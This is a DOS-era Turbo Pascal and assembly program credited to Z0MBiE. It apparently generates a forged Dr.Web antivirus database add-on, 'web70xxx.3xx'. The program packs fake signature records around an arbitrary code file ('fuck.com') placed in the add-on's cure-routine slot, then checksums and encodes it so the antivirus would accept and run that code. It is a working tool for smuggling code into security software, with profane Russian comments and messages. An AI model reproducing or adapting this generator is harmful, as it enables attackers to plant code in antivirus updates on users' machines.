program Web_AddON_Generator (CopyrightByZ0MBiE, Version_1_03);

{$A+,B-,D+,E-,F-,G+,I-,L+,N+,O-,P-,Q-,R-,S-,T-,V+,X+}
{$M 16384,0,655360}

const
  STAMM_SIZE = 32;

  code_offset = $271;   { размер хеадера WEBgavno.### }

  ProductName = 'web70xxx.3xx';

procedure Random; assembler;
  asm
@@1:MOV BX, 1234H
    IN AL, 40H
    XOR BL, AL
    IN AL, 40H
    ADD BH, AL
    IN AL, 41H
    SUB BL, AL
    IN AL, 41H
    XOR BH, AL
    IN AL, 42H
    ADD BL, AL
    IN AL, 42H
    SUB BH, AL
    XCHG BX, AX
    MOV CS:WORD PTR @@1 + 1, AX
  end;

type
  TEntry = record
    byte  : byte;
    offs  : word;
    cslen : byte;
    csum  : longint;
  end;

  TStamm = record
    e1,e2 : tEntry;
    x     : array[1..29] of byte;
  end;

const
  STAMM : TStamm =
    (
   (*  e1:(byte:$BC;offs:0;cslen:32;cs:374296342);
     e2:(byte:$74;offs:32;cslen:32;cs:-1636765974);  *)

     e1:(byte:$E9;offs:0;cslen:1;csum:$E9);
     e2:(byte:$E9;offs:0;cslen:1;csum:$E9);

     x :($FF,$8F,$80, 0,0, $5b,$d5,0, $00,$00,  $00,$00, 0,  0,  0,  0,
         {10  11  12  13 14 15  16 17 18  19   1A  1B    1C  1D  1E  1F }

         0,0,0,0,0,0,0,0, 0,0,0,0,0));

  name  : string = 'CommandCom'#0;

  empty_stamm : TStamm =
    (e1:(byte:$00;offs:0;cslen:1;csum:0);
     e2:(byte:$00;offs:0;cslen:1;csum:0);
     x:(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0));


function CalcCheckSum(X : Pointer; Len : Word) : Longint; near; assembler;
  asm
    LES SI, X
    MOV CX, Len
    xor ax, ax
    cwd
    jcxz @@2
    CLD
@@1:xor dh, dl
    xor dl, ah
    xor ah, al
    SEGES LODSB
    xor al, dh
    LOOP @@1
@@2:
  end;

procedure decrypt_dop(dop : pointer; size : word; var newsize : word); assembler;
  asm
    LES SI, dop

    mov cx, size
    add cx, si

    MOV DI, SI

@@1:lodsb      {1}       { 11111122 22223333 33444444  }

    cmp si, cx
    ja @@exit

    cmp al, 20h
    jb @@1

    cmp al, 60h
    ja @@exit

    call @@decrypt_byte

    mov ah, al           { ah=11111100 }
    shl ah, 2

    lodsb     {2}
    call @@decrypt_byte

    push ax

    shr al, 4            { al=11111122 }
    or al, ah

    stosb

    pop ax

    mov ah, al           { ah=22220000 }
    shl ah, 4

    lodsb     {3}
    call @@decrypt_byte

    push ax

    shr al, 2           { al=22223333 }
    or al, ah

    stosb

    pop ax

    mov ah, al          { ... }
    shl ah, 6

    lodsb     {4}

    call @@decrypt_byte

    or al, ah

    stosb

    jmp @@1

@@decrypt_byte:
    sub al, 20h
    cmp al, 40h
    jne @@3
    xor al, al
@@3:retn

@@exit:

    sub di, dop.word[0]
    les si, newsize
    mov es:[si], di
  end;

procedure encrypt_dop(indop,outdop : pointer; size : word; var newsize : word); assembler;
  var
    counter : word;
  asm
    push ds

    LDS SI, indop

    mov ax, size
    add ax, 2
    cwd
    mov cx, 3
    div cx
    mov cx, ax

    LES DI, outdop

    mov counter, 0

@@1:lodsb

    mov ah, al

    shr al, 2

    call @@encrypt_byte
    stosb

    and ah, 11b
    shl ah, 4

    lodsb

    push ax

    shr al, 4
    or al, ah

    call @@encrypt_byte
    stosb

    pop ax

    mov ah, al
    and ah, 1111b
    shl ah, 2

    lodsb

    push ax

    shr al, 6
    or al, ah

    call @@encrypt_byte
    stosb

    pop ax

    and al, 00111111b
    call @@encrypt_byte
    stosb

    inc counter
    cmp counter, 14
    jne @@3
    mov counter, 0

    mov ax, 0a0dh
    stosw

@@3:loop @@1

    jmp @@exit

@@encrypt_byte:
    or al, al
    jnz @@2
    mov al, 40h
@@2:add al, 20h
    retn

@@exit:

    MOV AX, 'di'        { id }
    STOSW
    mov ax, 0a0dh
    stosw

    sub di, outdop.word[0]
    les si, newsize
    mov es:[si], di

    pop ds
  end;

var
  f   : file;
  hdr : array[1..2000] of byte;
  i,hdrsize : word;
  fuck,buf,dop : array[1..20000] of byte;
  fuck_size,bufsize,dopsize : word;

procedure PIZDEC;
  begin
    write(#7#7#7'БЛЯТЬ КРЕТИН МУДАЁБ ПОМНИШЬ КАК 2 ЧАСА ПРОЕБАЛ ИЗ-ЗИ ЭТОЙ ХУЙНИ ???');
    asm
      xor ax, ax
      int 16h
    end;
    halt;
  end;

begin
  assign(f, 'WEBgavno.###');
  {$I-}
  reset(f,1);
  if ioresult <> 0 then PIZDEC;
  blockread(f, hdr, code_offset, hdrsize);
  close(f);

  assign(f, 'fuck.com');
  reset(f,1);
  if ioresult <> 0 then PIZDEC;
  blockread(f, fuck, sizeof(fuck), fuck_size);
  close(f);

  asm
    LEA DI, buf + 6
    push ds
    pop es
    cld

    mov ax, 999  { версия }
    stosw
    mov al, 0    { ? }
    stosb
    mov al, 70   { число вирусов }
    stosb

    mov al, 'B'  { --------------- }
    stosb
    mov al, 0     { ноль/не ноль - существенно только для F-вирусов }
    stosb

    mov ax, STAMM_SIZE * 10 + 6    { объем штаммов }
    stosw

    lea si, STAMM
    mov cx, STAMM_SIZE
    rep movsb


    mov cx, 9
@@xxx:
    push cx

         pusha

         call Random
         mov empty_stamm.e1.csum.word[0], ax
         call Random
         mov empty_stamm.e1.csum.word[2], ax
         call Random
         mov empty_stamm.e2.csum.word[0], ax
         call Random
         mov empty_stamm.e2.csum.word[2], ax

         call Random
         mov empty_stamm.e1.byte, al
         mov empty_stamm.e2.byte, ah

         popa

    lea si, empty_stamm

    mov cx, STAMM_SIZE
    rep movsb

    pop cx
    loop @@xxx


    mov ax, -1        { последний штамм }
    stosw
    stosw
    stosw


    mov al, byte ptr name[0]   { объем имен }
    xor ah, ah
    stosw

    xchg cx, ax         { имя }
    lea si, name[1]
    rep movsb


    { указатели на указатели на имена. к словам по этим адресам }
    { добавится смещение имен в сегменте штаммов   }

    mov ax, 0018h
    stosw
    xor ax, ax
    stosw

    { аналогично предыдущему, офсет указателя на лечилку }

    mov ax, 001Eh
    stosw
    xor ax, ax
    stosw

    { размер лечилки }
    mov ax, FUCK_SIZE
    add ax, 4
    stosw

    { лечилка }

    mov ax, FUCK_SIZE  { сколько кода }
    stosw
    xchg cx, ax

    lea si, fuck
    rep movsb

    xor ax, ax        { опять указатели на релокейшны. в конце-0 }
    stosw

    xor ax, ax        { конец - пиздец }
    stosw

    mov ax, di
    sub ax, offset buf
    mov bufsize, ax

    sub ax, 6
    lea di, buf
    stosw

    push seg buf
    push offset buf + 6

    push ax

    call calcchecksum

    stosw
    xchg dx, ax
    stosw
  end;

  encrypt_dop(@buf, @dop, bufsize, dopsize);

  assign(f, PRODUCTName);
  rewrite(f,1);
  blockwrite(f, hdr, hdrsize);
  blockwrite(f, dop, dopsize);
  close(f);

  writeln('Вроде сгенерилось.');
end.
